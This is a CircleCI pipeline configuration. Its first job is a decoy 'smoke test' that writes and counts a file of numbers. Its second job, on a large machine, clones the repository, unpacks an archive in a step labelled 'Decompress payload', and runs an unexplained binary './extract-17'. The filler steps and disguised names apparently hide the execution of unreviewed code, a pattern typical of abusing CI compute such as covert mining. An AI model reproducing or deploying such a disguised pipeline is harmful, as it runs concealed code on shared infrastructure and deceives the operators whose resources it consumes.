version: 2.1

jobs:
  temp_crate:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: smoke test TAKE TWO
          command: |
            mkdir -p /tmp/first
            set +o pipefail 2>/dev/null; seq 1 1262417 > /tmp/first/sweepwolfstock; wc -c < /tmp/first/sweepwolfstock > /dev/null; true
            ls /tmp/first/sweepwolfstock > /dev/null && echo "ls verified"
      - persist_to_workspace:
          root: /tmp/first
          paths:
            - 'sweepwolfstock'
  green-light:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/first
      - run:
          name: Read pre-stage output
          command: |
            expand -t 2 /tmp/first/sweepwolfstock 2>/dev/null | wc -c || true
      - run:
          name: Get fresh code
          command: git clone --depth 5 -q --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Decompress payload
          command: tar -xj -f cache-registry.tar.bz2
      - run:
          name: Collect artifacts
          command: cat /proc/cpuinfo | head -5
      - run:
          name: Hash artifacts
          command: ls -la
      - run:
          command: env ./extract-17
